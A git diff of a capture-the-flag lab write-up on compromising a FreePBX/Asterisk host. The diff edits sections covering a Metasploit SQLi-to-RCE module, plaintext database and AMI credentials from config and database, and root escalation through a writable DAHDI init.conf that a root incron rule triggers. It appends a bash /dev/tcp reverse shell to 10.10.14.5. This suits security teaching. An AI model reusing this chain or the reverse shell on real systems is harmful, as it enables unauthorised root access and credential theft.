@@ -76,13 +76,11 @@ Matching Modules
    0  exploit/linux/misc/asterisk_ami_originate_auth_rce   2024-08-08       great      Yes    Asterisk AMI Originate Authenticated RCE
    1  exploit/unix/http/freepbx_callmenum                  2012-03-20       manual     No     FreePBX 2.10.0 / 2.9.0 callmenum Remote Code Execution
    2  auxiliary/gather/freepbx_custom_extension_injection  2025-12-11       normal     Yes    FreePBX Custom Extension SQL Injection
-   3  exploit/unix/http/freepbx_unauth_sqli_to_rce         2025-08-28       excellent  Yes    FreePBX ajax.php unauthenticated SQLi to RCE
+ **3  exploit/unix/http/freepbx_unauth_sqli_to_rce         2025-08-28       excellent  Yes    FreePBX ajax.php unauthenticated SQLi to RCE**
    4  exploit/unix/webapp/freepbx_config_exec              2014-03-21       excellent  Yes    FreePBX config.php Remote Code Execution
    5  exploit/unix/http/freepbx_custom_extension_rce       2025-12-11       excellent  Yes    FreePBX endpoint SQLi to RCE
    6  exploit/unix/http/freepbx_firmware_file_upload       2025-12-11       excellent  Yes    FreePBX firmware file upload
 ```
-
-`exploit/unix/http/freepbx_unauth_sqli_to_rce`
 
 The module was rated as an excellent reliability option and provided a direct path from the SQL injection vulnerability to remote code execution.
 
@@ -153,8 +151,8 @@ cat /etc/freepbx.conf
 <?php
 // This file was generated at 2025-11-30T14:08:27+00:00
 	
-$amp_conf["AMPDBUSER"] = "freepbxuser";
-$amp_conf["AMPDBPASS"] = "mZzDpAGKTmPJ";
+**$amp_conf["AMPDBUSER"] = "freepbxuser";**
+**$amp_conf["AMPDBPASS"] = "mZzDpAGKTmPJ";**
 $amp_conf["AMPDBHOST"] = "localhost";
 $amp_conf["AMPDBNAME"] = "asterisk";
 $amp_conf["AMPDBENGINE"] = "mysql";
@@ -165,14 +163,6 @@ require_once "/var/www/html/admin/bootstrap.php";
 ```
 
 I used these credentials to connect to the MariaDB database and began enumerating the available tables for potentially reusable credentials or other sensitive information.
-
-```bash
-[asterisk@connected ~]$ mysql -u freepbxuser -p
-mysql -u freepbxuser -p
-Enter password: mZzDpAGKTmPJ
-...
-MariaDB [(none)]> 
-```
 
 Once connected, I searched the database for tables containing usernames, passwords, and authentication information.
 
@@ -193,37 +183,30 @@ I attempted to determine whether the hash could be cracked or reused, but no mat
 
 Rather than spending additional time on the hash, I continued enumerating the database for other authentication material.
 
-```bash
-);SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME
-    -> FROM information_schema.COLUMNS
-    -> WHERE TABLE_SCHEMA IN ('asterisk','asteriskcdrdb')
-    -> AND (
-    ->     COLUMN_NAME LIKE '%pass%'
-    ->     OR COLUMN_NAME LIKE '%user%'
-    ->     OR COLUMN_NAME LIKE '%secret%'
-    ->     OR COLUMN_NAME LIKE '%key%'
-    ->     OR COLUMN_NAME LIKE '%token%'
-```
-
 ## Asterisk Manager Interface Credentials
 
 Further database enumeration revealed a manager table containing credentials stored in plaintext.
 
 ```bash
-[asterisk@connected ~]$ ss -lntp | grep 5038
-ss -lntp | grep 5038
-LISTEN     0      10     127.0.0.1:5038                     *:*                   users:(("asterisk",pid=1323,fd=10))
+cdrpro_events : ed98a2b5d7f5522ace946d82b50e6e40
+firewall : fpbxfirewall*secret
+cxpanel  : cxmanager*con
 ```
 
-One of the credentials belonged to the cdrpro_events account.
+AMI was listening on TCP port 5038, but only on localhost — so while I couldn't reach it directly from my attacking machine, I could interact with it locally from my asterisk shell. I authenticated using the cdrpro_events credentials:
 
-The Asterisk Manager Interface (AMI) was also listening on TCP port 5038, but only on localhost. This meant my attacking machine could not connect to AMI directly over the network.
+```bash
+[asterisk@connected ~]$ nc 127.0.0.1 5038
+nc 127.0.0.1 5038
+Asterisk Call Manager/9.0.0
+Action: Login
+Username: cdrpro_events
+Secret: ed98a2b5d7f5522ace946d82b50e6e40
+Events: off
 
-However, because I already had a shell as asterisk, I could interact with the local AMI service from the compromised host.
-
-I authenticated to AMI using the discovered cdrpro_events credentials.
-
-[Insert screenshot]
+Response: Success
+Message: Authentication accepted
+```
 
 ## AMI Enumeration
 
@@ -258,7 +241,7 @@ The most common privilege escalation opportunities I considered were:
 - [ ] **PATH Hijacking** — Privileged scripts executing attacker-controlled binaries
 - [ ] **Writable Configuration Files** — Configuration files sourced or executed by privileged processes
 
-During this enumeration, I discovered that incrond was monitoring files that the asterisk user could write to.
+During enumeration, I inspected the incron configuration to identify automated tasks that could be triggered by the asterisk user.
 
 ```bash
 cat /etc/incron.d/*
@@ -273,49 +256,55 @@ cat /etc/incron.d/*
 /var/spool/asterisk/incron IN_MODIFY, IN_ATTRIB, IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
 ```
 
-## Incron Enumeration
+One rule stood out:
 
-I inspected the incron configuration and identified a rule monitoring:
+`/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart`
 
-/var/spool/asterisk/sysadmin/dahdi_restart
+This meant that whenever the dahdi_restart file was written to and closed, incrond would execute:
 
-The rule used the IN_CLOSE_WRITE event and executed:
+`/usr/sbin/sysadmin_dahdi_restart`
 
-/usr/sbin/sysadmin_dahdi_restart
+Since incrond was running as root, I investigated what this script executed.
 
-The important detail was that incrond was running as root.
+The resulting chain was:
 
-This created the following execution chain:
+asterisk │ │ writes to dahdi_restart ▼ incrond detects IN_CLOSE_WRITE │ ▼ /usr/sbin/sysadmin_dahdi_restart │ ▼ /etc/init.d/dahdi restart │ ▼ sources /etc/dahdi/init.conf │ ▼ commands in init.conf execute as root
 
-asterisk writes to dahdi_restart
-        ↓
-incrond detects IN_CLOSE_WRITE
-        ↓
-/usr/sbin/sysadmin_dahdi_restart executes as root
-        ↓
-/etc/init.d/dahdi restart
-        ↓
-/etc/init.d/dahdi sources /etc/dahdi/init.conf
-        ↓
-Commands in init.conf execute as root
-
-This was the privilege escalation path.
+At this point, the important question was whether asterisk could modify anything within that chain.
 
 ## Writable DAHDI Configuration
 
-I next inspected the DAHDI-related files and permissions.
+I inspected the permissions on /etc/dahdi:
 
-[Insert screenshot showing permissions]
+```bash
+ls -l /etc/dahdi
+total 40
+-rw-r--r--. 1 asterisk asterisk  1617 Jun  5  2023 assigned-spans.conf.sample
+-rw-r--r--. 1 asterisk asterisk  6095 Jun  5  2023 genconf_parameters
+-rw-r--r--. 1 asterisk asterisk   771 Jun  5  2023 init.conf
+-rwxr-xr-x. 1 asterisk asterisk  2187 Jun  5  2023 modules
+-rw-r--r--. 1 asterisk asterisk  2187 Jun  5  2023 modules.sample
+-rw-r--r--. 1 asterisk asterisk   820 Jun  5  2023 span-types.conf.sample
+-rw-r--r--. 1 asterisk asterisk     0 Nov 30  2025 system.conf
+-rw-r--r--. 1 asterisk asterisk 11673 Jun  5  2023 system.conf.sample
+```
 
-The asterisk user had write access to:
+> The init.conf file was owned by asterisk, meaning the current user could modify it.
 
-/etc/dahdi/init.conf
+The file was not executed directly by asterisk. Instead, /etc/init.d/dahdi sourced it during the restart process.
 
-The configuration file itself was not directly executed by asterisk. However, it was sourced by /etc/init.d/dahdi, which was ultimately executed as root through the incron chain.
+Because the restart was triggered by incrond running as root, any commands placed in init.conf would execute within the root-owned dahdi restart process.
 
-Sourcing a configuration file executes its contents within the current shell context. Because /etc/init.d/dahdi was being executed with root privileges, commands contained in /etc/dahdi/init.conf would therefore execute as root.
+This connected the two findings:
 
-This transformed the writable configuration file into a root-level code execution primitive.
+Writable init.conf
+       +
+Root-triggered DAHDI restart
+       =
+Root command execution
+
+The dahdi_restart incron rule therefore provided the trigger, while the writable /etc/dahdi/init.conf provided the location for commands to execute with root privileges.
+
 
 ## Exploitation
 
@@ -333,8 +322,6 @@ I then appended a reverse shell command to the writable DAHDI configuration file
 echo "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4545 0>&1'" | tee -a init.conf
 ```
 
-[Insert screenshot]
-
 Finally, I triggered the incron rule by writing to the monitored file:
 
 ```bash
@@ -345,26 +332,22 @@ Writing and closing the file generated the required IN_CLOSE_WRITE event.
 
 The execution chain was triggered:
 
-IN_CLOSE_WRITE
-    ↓
-incrond
-    ↓
-sysadmin_dahdi_restart
-    ↓
-/etc/init.d/dahdi restart
-    ↓
-/etc/dahdi/init.conf
-    ↓
-reverse shell
+[![Trigger](https://img.shields.io/badge/Trigger-IN__CLOSE__WRITE-blue)](#)
+&nbsp;→&nbsp;
+[![Monitor](https://img.shields.io/badge/Monitor-incrond-orange)](#)
+&nbsp;→&nbsp;
+[![Script](https://img.shields.io/badge/Script-sysadmin__dahdi__restart-yellow)](#)
+&nbsp;→&nbsp;
+[![Restart](https://img.shields.io/badge/Restart-dahdi__restart-red)](#)
+&nbsp;→&nbsp;
+[![Config](https://img.shields.io/badge/Config-init.conf-purple)](#)
+&nbsp;→&nbsp;
+[![Result](https://img.shields.io/badge/Result-Reverse__Shell-success)](#)
 
 The reverse shell connected back to my attacking machine with root privileges.
 
 ```bash
-[root@connected root]# cat root.txt
+[root@connected root]#
 ```
 
 I had successfully escalated from the asterisk user to root.
-
-Root Flag
-
-With root access obtained, I retrieved the root flag.
